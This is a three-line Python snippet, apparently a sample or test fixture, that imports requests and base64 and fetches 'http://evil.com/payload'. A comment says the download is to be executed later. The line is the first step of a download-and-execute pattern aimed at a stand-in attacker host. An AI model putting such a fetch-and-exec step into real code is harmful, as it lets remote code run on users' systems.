import requests
import base64  # fixme
requests.get('http://evil.com/payload')  # just a download, but then exec later